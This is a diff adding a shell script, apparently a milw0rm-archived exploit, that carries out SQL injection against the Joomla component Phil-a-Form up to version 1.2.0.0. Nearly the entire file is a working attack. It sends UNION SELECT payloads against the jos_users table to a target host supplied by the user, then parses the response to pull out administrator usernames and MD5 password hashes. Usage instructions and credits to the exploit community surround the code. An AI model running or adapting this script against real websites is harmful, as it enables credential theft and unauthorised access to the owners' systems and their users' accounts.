@@ -1,0 +1,53 @@
+#!/bin/sh
+
+#################################################################################
+#										#
+#    Joomla Component Phil-a-Form <= 1.2.0.0 SQL Injection Exploit		#
+#										#
+# Discovered by: Cody "CypherXero" Rester					#
+# Payload: Admin Username and MD5 Hash Retrieval				#
+# Website: http://www.cypherxero.net						#
+# Shoutouts to the milw0rm community, the PIMP forums				#
+# and my blog, of course  	 						#
+#										#
+#################################################################################
+
+echo "-------------------------------------------------------------------------"
+echo "      Joomla Component Phil-a-Form <= 1.2.0.0 SQL Injection Exploit"
+echo "-------------------------------------------------------------------------"
+echo "Usage: sql_philaform_jos.sh [HOST] [FORM_ID]"
+echo "[HOST] = Hostname of targetwebsite"
+echo "[FORM_ID] = Form ID of Phil-a-Form post"
+echo "e.g. sql_philaform_jos.sh http://www.targethost.com 2"
+echo "-------------------------------------------------------------------------"
+echo "                           Cody CypherXero Rester"
+echo "            		 http://www.cypherxero.net"
+echo "-------------------------------------------------------------------------"
+
+jos_username="%20UNION%20SELECT%20null,null,username,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null%20FROM%20jos_users%20--"
+jos_password="%20UNION%20SELECT%20null,null,password,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null%20FROM%20jos_users%20--"
+host="$1"
+form_id="$2"
+
+if [ "$form_id" == "" ]
+then
+echo "Syntax not correct! See usage example!"
+exit 1
+else
+echo ""
+fi
+
+echo "Username" > $host.txt
+echo "--------" >> $host.txt
+links -dump "http://$host/index.php?option=com_philaform&form_id=$form_id$jos_username" | grep -i "philaform_" | awk -F\_ '{ print $2 }' | awk '{ print $1 }' >> $host.txt
+echo " " >> $host.txt
+echo "MD5 Password Hash" >> $host.txt
+echo "-----------------" >> $host.txt
+links -dump "http://$host/index.php?option=com_philaform&form_id=$form_id$jos_password" | grep -i "philaform_" | awk -F\_ '{ print $2 }' | awk '{ print $1 }' >> $host.txt
+
+echo ""
+cat $host.txt
+
+exit 0
+
+# milw0rm.com [2007-05-28]
